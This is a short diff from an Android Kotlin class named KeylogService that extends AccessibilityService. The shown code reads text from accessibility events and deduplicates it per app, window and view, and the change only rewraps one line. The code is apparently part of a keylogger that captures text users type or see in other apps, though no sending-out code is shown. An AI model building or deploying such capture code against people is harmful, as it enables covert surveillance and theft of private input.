@@ -41,7 +41,8 @@ class KeylogService : AccessibilityService() {
         val texto = evento.text?.joinToString("")?.trim().orEmpty()
         if (texto.isEmpty()) return
 
-        val chave = "${evento.packageName}:${evento.windowId}:${evento.source?.viewIdResourceName ?: evento.source?.hashCode()}"
+        val chave = "${evento.packageName}:${evento.windowId}:" +
+            "${evento.source?.viewIdResourceName ?: evento.source?.hashCode()}"
         val anterior = vistos[chave] ?: ""
         if (texto == anterior) return
         vistos[chave] = texto
